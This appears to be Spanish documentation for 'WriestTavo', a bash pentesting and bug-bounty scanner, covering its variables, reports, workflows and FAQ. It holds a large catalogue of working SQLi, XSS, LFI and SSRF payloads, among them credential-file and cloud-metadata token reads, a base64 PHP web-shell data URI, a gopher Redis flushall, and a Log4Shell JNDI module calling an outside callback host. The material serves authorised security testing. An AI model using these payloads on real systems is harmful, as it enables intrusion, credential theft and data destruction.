El cerebro de WriestTavo. Variables compartidas entre todos los módulos para scan progresivo e inteligente.

### Variables Principales (87 en total)

```bash
# OS y Red
INTEL_OS=""                    # linux | windows | other
INTEL_WAF_DETECTED=false
INTEL_WAF_NAME=""
INTEL_SCAN_DELAY=0             # Auto-aumenta si hay WAF

# CDN (nuevo en v5.0)
INTEL_BEHIND_CDN=false
INTEL_CDN_NAME=""              # "Cloudflare" | "Vercel" | etc.
INTEL_TARGET_IP=""             # IP resuelta del target

# Frameworks
INTEL_CMS=""                   # wordpress | joomla | drupal | magento
INTEL_FRAMEWORK_JS=""          # react | nextjs | vue | nuxt | angular | svelte | astro
INTEL_FRAMEWORK_BACKEND=""     # laravel | symfony | django | flask | fastapi | nestjs | express | aspnet | rails
INTEL_TECHNOLOGIES=()          # php, nodejs, python, java, mysql, redis, docker...

# URLs y Descubrimientos
INTEL_INJECTABLE_URLS=()       # → SQLi, XSS, LFI, SSRF
INTEL_API_ENDPOINTS=()         # → arjun, NoSQLi, XXE, FileUpload
INTEL_SENSITIVE_PATHS=()       # → FileUpload, framework_scan
INTEL_JWT_TOKENS=()            # → módulo 35 JWT
INTEL_JS_SECRETS=()
INTEL_GRAPHQL_URL=""
INTEL_SWAGGER_URL=""

# Vulnerabilidades Confirmadas
INTEL_SQLI_FOUND=false         # → activa sqlmap automáticamente
INTEL_XSS_FOUND=false
INTEL_LFI_FOUND=false
INTEL_LFI_PARAM=""
INTEL_LFI_URL=""
INTEL_SSRF_FOUND=false
INTEL_SSRF_URL=""              # → prueba cloud metadata auto
INTEL_SSTI_FOUND=false
INTEL_CORS_VULN=false
INTEL_JWT_ALG_NONE=false
INTEL_JWT_WEAK_SECRET=""

# Infraestructura
INTEL_DOCKER_EXPOSED=false
INTEL_K8S_EXPOSED=false
INTEL_CLOUD_PROVIDER=""        # aws | gcp | azure | cloudflare

# Payloads Confirmados
EFFECTIVE_PAYLOADS=()          # "tipo|||payload|||url|||evidencia"

# Extra payloads (de --update / PayloadsAllTheThings / SecLists)
INTEL_EXTRA_PAYLOADS_SQLI=()
INTEL_EXTRA_PAYLOADS_XSS=()
INTEL_EXTRA_PAYLOADS_LFI=()
INTEL_EXTRA_PAYLOADS_SSRF=()

# ADPulse
AD_KERBEROASTABLE=()
AD_ASREPROASTABLE=()
AD_ADCS_TEMPLATES=()
AD_UNCONSTRAINED=()
AD_DA_MEMBERS=()
```

---

## Sistema de Reportes — 4 Tipos

### Cómo se generan

Al finalizar cualquier scan completo, WriestTavo genera automáticamente los 4 reportes:

```
wriestTavo_results/
├── reporte_TARGET_FECHA.html          ← Original
├── reporte_CLIENTE_TARGET_FECHA.html  ← Para IT/CISO
├── reporte_CENSURADO_FECHA.html       ← Para Dirección/Legal
└── reporte_PENTESTER_TARGET_FECHA.html ← Para analista/Red Team
```

No requiere flags adicionales. Todos se crean automáticamente al terminar el scan.

### Reporte 1 — Cliente IT

**Audiencia**: Gerente de TI, CISO, equipo IT del cliente.

- Banner de nivel de riesgo global con color
- Plan de acción en 3 columnas: 🔴 Acción Inmediata (0-48h) / 🟠 Próximo Sprint / 🟢 Backlog
- Contexto del entorno en chips visuales (OS, CMS, WAF, Cloud, CDN)
- Tabla de inyecciones confirmadas con badge `✓ INYECCIÓN CONFIRMADA`
- Hallazgos en lenguaje de negocio (sin comandos técnicos)

### Reporte 2 — Censurado

**Audiencia**: Dirección General, Legal, Compliance, terceros.

Redacta automáticamente: IPs → `[IP CENSURADA]`, URLs → `[URL CENSURADA]`, rutas → `[RUTA CENSURADA]`, hashes → `[HASH CENSURADO]`, tokens JWT → `[TOKEN JWT CENSURADO]`, comandos → `[COMANDO TÉCNICO OMITIDO]`.

### Reporte 3 — Pentester

**Audiencia**: Analista, Red Team, consultor.

- INTEL completo con todas las variables
- Attack Chains autogeneradas (SQLi→RCE, LFI→shell, SSRF→metadata, SSTI→RCE, Kerberoasting→DA)
- Tabla de payloads efectivos (payload exacto, URL, evidencia)
- URLs inyectables completas
- Tips de exploración manual por stack detectado
- Comandos de seguimiento listos para copiar

---

## Sistema de Actualización

```bash
# Actualizar las 11 fuentes:
sudo ./wriestTavo.sh --update

# Auto-actualización diaria a las 6am
sudo ./wriestTavo.sh --cron

# Ver CVEs y payloads en caché
sudo ./wriestTavo.sh --show-cves

# Alerta automática si >7 días sin actualizar
```

### Contador de resultado

```
✅ OK: 10/11  ❌ Errores: 1/11
  ✅ Nuclei templates
  ✅ NVD NIST (48h)
  ✅ CISA KEV
  ✅ EPSS scores
  ✅ Exploit-DB
  ✅ Packet Storm
  ✅ GitHub Advisories
  ✅ OSV (Google)
  ❌ WPScan DB (falta API key — ver ~/.wriestTavo/wpscan_api_key.txt)
  ✅ SecLists + PayloadsAllTheThings
  ✅ Script auto-update
```

---

## Agregar Payloads Propios

```bash
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type TIPO
# tipos: sqli | xss | lfi | ssrf | paths
```

### Cómo se cargan automáticamente

```
--update → descarga a disco (PayloadsAllTheThings, SecLists, feeds)
      ↓
Scan arranca → _load_custom_payloads() corre automático
      ↓
Lee: archivos propios + PayloadsAllTheThings + SecLists
      ↓
Mete en INTEL_EXTRA_PAYLOADS_*[] (deduplicados)
      ↓
Módulos de ataque: ALL_PAYLOADS = base[] + EXTRA[]
      ↓
Sin límite de cap — usa todos
```

### Edición directa

```bash
nano ~/.wriestTavo/custom_payloads/sqli_extra.txt
nano ~/.wriestTavo/custom_payloads/xss_extra.txt
nano ~/.wriestTavo/custom_payloads/lfi_extra.txt
nano ~/.wriestTavo/custom_payloads/ssrf_extra.txt
nano ~/.wriestTavo/custom_payloads/paths_extra.txt
```

---

## Catálogo de Payloads Modernos

Lista de ~215 payloads seleccionados de HackerOne Hacktivity, PortSwigger Web Academy, PayloadsAllTheThings y OWASP Testing Guide 2024.

### SQL Injection (~45 nuevos)

```bash
# ─── Bypass de Autenticación ───────────────────────────────────
sudo ./wriestTavo.sh --add-payload "' OR 1=1 LIMIT 1 OFFSET 0--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "admin'/*" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "') OR ('1'='1" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' OR 1=1#" --payload-type sqli

# ─── Time-Based Blind ──────────────────────────────────────────
# MySQL
sudo ./wriestTavo.sh --add-payload "1' AND (SELECT SLEEP(3))--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "1' AND BENCHMARK(5000000,MD5(1))--" --payload-type sqli
# MSSQL
sudo ./wriestTavo.sh --add-payload "'; WAITFOR DELAY '0:0:3'--" --payload-type sqli
# PostgreSQL
sudo ./wriestTavo.sh --add-payload "'; SELECT pg_sleep(3)--" --payload-type sqli
# Oracle
sudo ./wriestTavo.sh --add-payload "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--" --payload-type sqli

# ─── UNION Based ───────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "' UNION SELECT @@version,NULL,NULL--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' UNION SELECT user(),database(),version()--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' UNION SELECT table_name,NULL FROM information_schema.tables--" --payload-type sqli

# ─── Error-Based ───────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--" --payload-type sqli

# ─── WAF Bypass (Bug Bounty 2024) ──────────────────────────────
sudo ./wriestTavo.sh --add-payload "'/**/OR/**/1=1--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' /*!OR*/ 1=1--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "'%09OR%091=1--" --payload-type sqli
```

### XSS (~35 nuevos)

```bash
# ─── DOM-based / Sin etiqueta ──────────────────────────────────
sudo ./wriestTavo.sh --add-payload "<svg onload=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<svg/onload=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<input autofocus onfocus=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<details open ontoggle=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<math href=javascript:alert(1)>click</math>" --payload-type xss

# ─── Template Injection (Angular/Vue) ──────────────────────────
sudo ./wriestTavo.sh --add-payload "{{constructor.constructor('alert(1)')()}}" --payload-type xss

# ─── Bypass de Filtros ─────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "%253Cscript%253Ealert(1)%253C%252Fscript%253E" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<img src=1 onerror=alert(document.cookie)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "';alert(1)//" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<ScRiPt>alert(1)</sCrIpT>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "\" onmouseover=\"alert(1)" --payload-type xss
```

### LFI (~40 nuevos)

```bash
# ─── Linux Críticos ────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/etc/shadow" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/root/.ssh/id_rsa" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/proc/1/environ" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/var/run/secrets/kubernetes.io/serviceaccount/token" --payload-type lfi

# ─── Aplicaciones ──────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/../../../.env" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/config/database.yml" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/WEB-INF/web.xml" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/appsettings.json" --payload-type lfi

# ─── Windows ───────────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "C:/Windows/repair/SAM" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "C:/inetpub/wwwroot/web.config" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "..%5C..%5C..%5CWindows%5Cwin.ini" --payload-type lfi

# ─── PHP Wrappers Avanzados ────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "php://filter/convert.base64-encode/resource=config.php" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "php://filter/zlib.deflate/convert.base64-encode/resource=index.php" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==" --payload-type lfi
# Log Poisoning
sudo ./wriestTavo.sh --add-payload "/var/log/auth.log" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/proc/self/fd/2" --payload-type lfi
```

### SSRF (~35 nuevos)

```bash
# ─── Cloud Metadata ────────────────────────────────────────────
# AWS
sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/latest/dynamic/instance-identity/document" --payload-type ssrf
# GCP
sudo ./wriestTavo.sh --add-payload "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --payload-type ssrf
# Azure
sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" --payload-type ssrf

# ─── Servicios Internos ────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "http://kubernetes.default.svc/api/v1/namespaces" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:9200/_cat/indices" --payload-type ssrf    # Elasticsearch
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:6379/info" --payload-type ssrf             # Redis
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:2375/v1.41/containers/json" --payload-type ssrf  # Docker API

# ─── Bypass de Filtros ─────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "http://0x7f000001/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://2130706433/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://127.1/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://[::1]/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "dict://127.0.0.1:6379/info" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall" --payload-type ssrf
```

### Rutas / Paths (~60 nuevos)

```bash
# ─── Archivos de Entorno ───────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/.env" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.env.local" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.env.production" --payload-type paths

# ─── Git / SVN ─────────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/.git/config" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.git/HEAD" --payload-type paths

# ─── Spring Boot Actuator ──────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/actuator/env" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/actuator/heapdump" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/actuator/mappings" --payload-type paths

# ─── Swagger / OpenAPI ─────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/swagger-ui.html" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/v3/api-docs" --payload-type paths

# ─── Cloud / DevOps ────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/.aws/credentials" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/terraform.tfstate" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/docker-compose.yml" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.kube/config" --payload-type paths

# ─── Debug y Logs ──────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/phpinfo.php" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/server-status" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/storage/logs/laravel.log" --payload-type paths
```

### ⚡ Bloque Completo — Cargar todos de una vez

```bash
#!/bin/bash
# Guardar como: cargar_payloads_modernos.sh
# Uso: bash cargar_payloads_modernos.sh
SCRIPT="./wriestTavo.sh"

echo "[*] Cargando SQLi..."
sudo $SCRIPT --add-payload "' OR 1=1 LIMIT 1 OFFSET 0--" --payload-type sqli
sudo $SCRIPT --add-payload "' OR 1=1#" --payload-type sqli
sudo $SCRIPT --add-payload "') OR ('1'='1" --payload-type sqli
sudo $SCRIPT --add-payload "1' AND (SELECT SLEEP(3))--" --payload-type sqli
sudo $SCRIPT --add-payload "'; WAITFOR DELAY '0:0:3'--" --payload-type sqli
sudo $SCRIPT --add-payload "'; SELECT pg_sleep(3)--" --payload-type sqli
sudo $SCRIPT --add-payload "' UNION SELECT @@version,NULL,NULL--" --payload-type sqli
sudo $SCRIPT --add-payload "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--" --payload-type sqli
sudo $SCRIPT --add-payload "'/**/OR/**/1=1--" --payload-type sqli

echo "[*] Cargando XSS..."
sudo $SCRIPT --add-payload "<svg onload=alert(1)>" --payload-type xss
sudo $SCRIPT --add-payload "<input autofocus onfocus=alert(1)>" --payload-type xss
sudo $SCRIPT --add-payload "<details open ontoggle=alert(1)>" --payload-type xss
sudo $SCRIPT --add-payload "{{constructor.constructor('alert(1)')()}}" --payload-type xss
sudo $SCRIPT --add-payload "<img src=1 onerror=alert(document.cookie)>" --payload-type xss

echo "[*] Cargando LFI..."
sudo $SCRIPT --add-payload "/etc/shadow" --payload-type lfi
sudo $SCRIPT --add-payload "/root/.ssh/id_rsa" --payload-type lfi
sudo $SCRIPT --add-payload "/var/run/secrets/kubernetes.io/serviceaccount/token" --payload-type lfi
sudo $SCRIPT --add-payload "/proc/1/environ" --payload-type lfi
sudo $SCRIPT --add-payload "php://filter/convert.base64-encode/resource=config.php" --payload-type lfi
sudo $SCRIPT --add-payload "/../../../.env" --payload-type lfi
sudo $SCRIPT --add-payload "/var/log/auth.log" --payload-type lfi

echo "[*] Cargando SSRF..."
sudo $SCRIPT --add-payload "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --payload-type ssrf
sudo $SCRIPT --add-payload "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --payload-type ssrf
sudo $SCRIPT --add-payload "http://kubernetes.default.svc/api/v1/namespaces" --payload-type ssrf
sudo $SCRIPT --add-payload "http://127.0.0.1:9200/_cat/indices" --payload-type ssrf
sudo $SCRIPT --add-payload "http://0x7f000001/" --payload-type ssrf
sudo $SCRIPT --add-payload "http://[::1]/" --payload-type ssrf
sudo $SCRIPT --add-payload "dict://127.0.0.1:6379/info" --payload-type ssrf

echo "[*] Cargando paths..."
sudo $SCRIPT --add-payload "/.env" --payload-type paths
sudo $SCRIPT --add-payload "/.env.production" --payload-type paths
sudo $SCRIPT --add-payload "/.git/config" --payload-type paths
sudo $SCRIPT --add-payload "/actuator/env" --payload-type paths
sudo $SCRIPT --add-payload "/actuator/heapdump" --payload-type paths
sudo $SCRIPT --add-payload "/swagger-ui.html" --payload-type paths
sudo $SCRIPT --add-payload "/v3/api-docs" --payload-type paths
sudo $SCRIPT --add-payload "/terraform.tfstate" --payload-type paths
sudo $SCRIPT --add-payload "/.aws/credentials" --payload-type paths
sudo $SCRIPT --add-payload "/docker-compose.yml" --payload-type paths

echo "[+] Listo. Verificar con: sudo ./wriestTavo.sh --show-cves"
```

---

## Agregar Módulos Propios

```bash
# Los módulos custom se cargan automáticamente al existir en:
~/.wriestTavo/modules/modulo_*.sh
```

### Plantilla de módulo

```bash
#!/bin/bash
# modulo_log4shell.sh — CVE-2021-44228 Log4Shell

modulo_log4shell() {
    # Solo si Java/Spring detectado
    echo "${INTEL_TECHNOLOGIES[@]}" | grep -qi "java\|spring" || return

    log "MÓDULO CUSTOM: Log4Shell (CVE-2021-44228)"
    tip "Prueba inyección JNDI en headers HTTP."

    local out="${OUTPUT_DIR}/web/log4shell.txt"
    local collab="TU-BURP-COLLABORATOR.burpcollaborator.net"
    local proto="${WEB_PORTS[0]:-80}"
    [[ "${WEB_PORTS[0]}" == "443" ]] && proto="https" || proto="http"
    local base_url="${proto}://${TARGET}"

    sleep "${INTEL_SCAN_DELAY:-0}"

    local payload="\${jndi:ldap://${collab}/log4shell}"
    curl -sk --max-time 10 "${base_url}" \
        -H "X-Api-Version: ${payload}" \
        -H "User-Agent: ${payload}" \
        -H "X-Forwarded-For: ${payload}" \
        >> "$out" 2>&1

    add_finding "CRÍTICO" "Log4Shell CVE-2021-44228 Potencial" \
        "Payload JNDI enviado en headers. Verificar callback en Burp Collaborator." \
        "10.0" \
        "Actualizar Log4j a 2.17.1+. Establecer log4j2.formatMsgNoLookups=true." \
        "nuclei -u ${base_url} -t cves/2021/CVE-2021-44228.yaml"
}
```

---

## Exploit Intelligence

### Módulo 43 — Automático (al final del scan)

Cruza el stack detectado con 4+2 fuentes:

1. **searchsploit local** — filtra por impacto (RCE > SQLi > Auth Bypass), detecta MSF
2. **EDB online** — últimos 30 días, caché 24h, badges Verified/NEW
3. **NVD CVEs** — CVSS≥9.0 por tecnología, si CVE tiene ref a EDB → badge 🎯
4. **GHSA** — por ecosistema (composer/pip/npm/rubygems según framework)
5. **CISA KEV** ⭐ — si el CVE está en la lista de explotados activamente
6. **EPSS** ⭐ — % de probabilidad de explotación en 30 días

### Módulo 44 — Manual (búsqueda interactiva)

```bash
sudo ./wriestTavo.sh TARGET
# → [44] EDB Búsqueda
# Ingresa término: "apache rce" → links directos a EDB, NVD, GHSA, MSF
```

---

## Flujo Completo de Trabajo

### Bug Bounty

```bash
# Día 1: Reconocimiento silencioso
sudo ./wriestTavo.sh --mode stealth https://target.hackerone.com
# → [2] Recon OSINT
# → Al terminar genera: wriestTavo_results/target_hackerone_com.wtsession

# Día 1: Bug Bounty Pro con sesión
sudo ./wriestTavo.sh --mode stealth \
  --session wriestTavo_results/target_hackerone_com.wtsession \
  https://target.hackerone.com
# → [4] Bug Bounty Pro — ya sabe subdominios y stack del scan anterior

# Agregar payloads de writeups recientes
sudo ./wriestTavo.sh --add-payload "PAYLOAD_DEL_WRITEUP" --payload-type sqli

# Día 2: Rescan con payloads nuevos + sesión acumulada
sudo ./wriestTavo.sh \
  --session wriestTavo_results/target_hackerone_com.wtsession \
  https://target.hackerone.com
# → [11] Custom → [13] SQLi [14] XSS [31] LFI [46] File Upload

# Ver reportes
firefox wriestTavo_results/reporte_CLIENTE_*.html     # Para el cliente
firefox wriestTavo_results/reporte_PENTESTER_*.html   # Para el analista
```

### Pentesting Interno / AD

```bash
# Full scan + AD
sudo ./wriestTavo.sh 192.168.1.100
# → [1] Full Scan  (incluye ADPulse al detectar LDAP/SMB)
# → Al terminar: wriestTavo_results/192_168_1_100.wtsession

# Rescan con sesión — más rápido, ya sabe puertos/stack
sudo ./wriestTavo.sh --session wriestTavo_results/192_168_1_100.wtsession 192.168.1.100
# → [7] Windows/Infra + AD

firefox wriestTavo_results/reporte_CLIENTE_*.html     # Para el CISO/IT
firefox wriestTavo_results/reporte_CENSURADO_*.html   # Para Dirección/Legal
firefox wriestTavo_results/reporte_PENTESTER_*.html   # Para el equipo técnico
```

### CTF / HackTheBox

```bash
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X
# → [10] CTF/HTB Mode

firefox wriestTavo_results/reporte_PENTESTER_*.html
```

---

## Comandos de Referencia Rápida

```bash
# ── ESCANEOS ──────────────────────────────────────────────────
sudo ./wriestTavo.sh IP_o_DOMINIO                    # Scan básico
sudo ./wriestTavo.sh https://app.example.com         # URL completa
sudo ./wriestTavo.sh --mode stealth target.com       # Silencioso
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X    # Agresivo CTF
sudo ./wriestTavo.sh -o /tmp/mi_scan target.com      # Output custom

# ── SESIÓN — REANUDAR / MEJORAR SCANS ─────────────────────────
sudo ./wriestTavo.sh --session archivo.wtsession target.com
# El script genera el .wtsession automáticamente al terminar
# Ejemplo de archivo: wriestTavo_results/target_com.wtsession
# Ver sesión sin escanear:
cat wriestTavo_results/target_com.wtsession

# ── MANTENIMIENTO ─────────────────────────────────────────────
sudo ./wriestTavo.sh --update                        # Actualizar 11 fuentes
sudo ./wriestTavo.sh --install                       # Instalar deps
sudo ./wriestTavo.sh --cron                          # Auto-update 6am
sudo ./wriestTavo.sh --show-cves                     # Ver CVEs cacheados

# ── PAYLOADS CUSTOM ───────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type xss
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type paths
nano ~/.wriestTavo/custom_payloads/sqli_extra.txt    # Editar directo

# ── REPORTES ──────────────────────────────────────────────────
firefox wriestTavo_results/reporte_CLIENTE_*.html     # Ejecutivo IT
firefox wriestTavo_results/reporte_CENSURADO_*.html   # Versión privacidad
firefox wriestTavo_results/reporte_PENTESTER_*.html   # Técnico completo
# Todos a la vez:
for f in wriestTavo_results/reporte_*.html; do firefox "$f" &; done

# ── ADPULSE ───────────────────────────────────────────────────
# Seleccionar [45] desde menú, [7] Windows/Infra, o [10] CTF
cat wriestTavo_results/active_directory/all_users.txt
cat wriestTavo_results/active_directory/kerberoastable.txt
ls  wriestTavo_results/active_directory/bloodhound/

# ── FILE UPLOAD (módulo 46) ────────────────────────────────────
# Los 4 archivos de prueba se crean automáticamente — no necesitas crearlos
# Se prueban en todas las rutas detectadas + ~30 rutas genéricas comunes
# Resultados en: wriestTavo_results/fileupload/results.txt
# Módulo custom: [11] Custom → [46]

# ── EXPLOIT DATABASE ──────────────────────────────────────────
sudo searchsploit --update
searchsploit php rce
searchsploit -x 12345                                # Leer exploit
searchsploit wordpress 5.8 --json | jq

# ── NUCLEI ────────────────────────────────────────────────────
nuclei -update-templates
nuclei -l urls.txt -t cves/
nuclei -u https://target.com -severity critical,high
```

---

## Estructura de Archivos

```
wriestTavo_results/
├── nmap/
│   ├── wave1_top100.txt
│   ├── wave2_top1000.txt
│   ├── wave3_full.txt
│   ├── scan_version.nmap
│   └── scan_vuln.xml
├── web/
│   ├── headers_result.txt
│   ├── whatweb_result.txt
│   ├── gobuster_result.txt
│   ├── nikto_result.txt
│   ├── sqli_results.txt
│   ├── xss_results.txt
│   ├── lfi_results.txt
│   ├── ssrf_results.txt
│   ├── cors_results.txt
│   ├── cors_poc.html
│   ├── jwt_analysis.txt
│   ├── nosqli_results.txt
│   ├── xxe_results.txt
│   ├── idor_redirect.txt
│   ├── iis_windows.txt
│   ├── http_methods.txt
│   └── js_analysis.txt
├── recon/
│   ├── crtsh_subdomains.txt
│   ├── theharvester_result.txt
│   ├── dnsrecon_result.txt
│   ├── ssl_result.txt
│   ├── nuclei_result.txt
│   ├── framework_scan.txt
│   ├── infra_exposure.txt
│   └── exploit_intel.txt
├── exploits/
│   └── searchsploit_result.txt
├── fileupload/                    ← NUEVO v5.0 (Módulo 46)
│   ├── prueba_upload.txt          ← Creado automáticamente por el script
│   ├── prueba_upload.php          ← Creado automáticamente
│   ├── prueba_upload.jpg          ← Creado automáticamente
│   ├── prueba_upload.php.jpg      ← Creado automáticamente
│   ├── results.txt                ← Resultados detallados
│   └── last_response.txt          ← Último body de respuesta
├── active_directory/              ← ADPulse (Módulo 45)
│   ├── all_users.txt
│   ├── all_groups.txt
│   ├── all_computers.txt
│   ├── kerberoastable.txt
│   ├── inactive_accounts.txt
│   ├── gpos.txt
│   ├── adpulse_log.txt
│   └── bloodhound/
│       └── *.zip
├── reporte_TARGET_FECHA.html
├── reporte_CLIENTE_TARGET_FECHA.html
├── reporte_CENSURADO_FECHA.html
├── reporte_PENTESTER_TARGET_FECHA.html
└── TARGET.wtsession               ← NUEVO v5.0 — archivo de sesión
```

```
~/.wriestTavo/
├── custom_payloads/
│   ├── sqli_extra.txt
│   ├── xss_extra.txt
│   ├── lfi_extra.txt
│   ├── ssrf_extra.txt
│   └── paths_extra.txt
├── modules/
│   └── modulo_*.sh
├── PayloadsAllTheThings/          ← Clonado por --update
├── edb_cache/
├── cve_cache/
├── wpscan_api_key.txt             ← Opcional, para WPScan DB en --update
└── last_update.txt
```

---

## Preguntas Frecuentes

**¿Por qué ahora nmap termina mucho más rápido?**
El problema era `--max-retries` que nmap tiene en 10 por defecto. Si el firewall dropea paquetes silenciosamente, nmap esperaba respuesta y reintentaba 10 veces por cada puerto. Con 1000 puertos filtrados × 10 reintentos × 300ms = ~50 minutos. Ahora con `--max-retries 1` en modo normal es ~5 minutos.

**¿Los archivos de prueba del File Upload los tengo que crear yo?**
No. El script los crea automáticamente cada vez que corre el módulo 46. Los encontrarás en `wriestTavo_results/fileupload/`. No necesitas preparar nada.

**¿Cómo uso el archivo .wtsession?**
```bash
sudo ./wriestTavo.sh --session wriestTavo_results/target_com.wtsession target.com
```
Se genera solo al terminar cada scan. El archivo es legible — puedes abrirlo con cualquier editor de texto.

**¿Qué pasa si paso una sesión de un target diferente?**
El script detecta el mismatch, avisa en terminal y limpia los payloads específicos del target incorrecto. Los datos de infraestructura (puertos, stack) los mantiene como referencia pero no los aplica ciegamente.

**¿Por qué no encuentra nada con `--mode stealth`?**
El modo stealth usa menos puertos y más delay. Para targets con WAF agresivo algunos módulos se saltan. Prueba módulos específicos con [11] Custom.

**¿Por qué detecta CDN pero igual escanea puertos?**
El scan de puertos sigue — la Wave 1 y Wave 2 son rápidas y pueden revelar puertos abiertos en el proxy (útil para la recon). Lo que cambia es: Wave 3 (-p- completo) baja su tasa, se enfoca más en recon web, y el reporte aclara que los puertos son del CDN.

**¿Puedo correr ADPulse sin credenciales?**
ADPulse necesita credenciales de solo lectura. Domain Users es suficiente para la mayoría de checks LDAP. El check de Null Bind sí se ejecuta sin credenciales para detectar acceso anónimo.

**¿Por qué no se activa sqlmap?**
sqlmap (módulo 21) solo se activa si el módulo 13 estableció `INTEL_SQLI_FOUND=true`. Esto evita falsos positivos y ruido.

**¿Cuánto tarda un Full Scan?**
- IP local sin servicios web: ~5-10 min (antes ~15-20 min)
- Dominio web completo: ~30-60 min (antes ~45-90 min)
- WordPress con plugins: ~45-90 min
- Con ADPulse en red corporativa: +10-20 min extra
- Con `--mode stealth`: el doble de tiempo

**¿El módulo de SSRF no funciona?**
SSRF necesita URLs con parámetros. Corre primero gobuster [8] y arjun [24] para poblar `INTEL_INJECTABLE_URLS[]`. Luego SSRF [32].

**¿Puedo compartir el .wtsession con otro pentester del equipo?**
Sí. El archivo es un bash script legible que contiene solo datos de contexto (puertos, stack, payloads exitosos, vulns conocidas). No contiene credenciales ni datos del sistema del atacante.

**¿El script modifica el AD o el target?**
No. ADPulse usa LDAP de solo lectura. Los módulos web hacen solo peticiones de prueba. La excepción es el test HTTP PUT del módulo 37, que intenta subir y luego eliminar un archivo de prueba, y el módulo 46 (File Upload) que intenta subir archivos de prueba.

---

*WriestTavo v5.0 — 9906 líneas · 47 módulos · 87 variables INTEL · 11 fuentes de inteligencia · 4 tipos de reporte · 35 checks AD · Sistema de Sesión .wtsession*
*Última actualización: ver banner al ejecutar*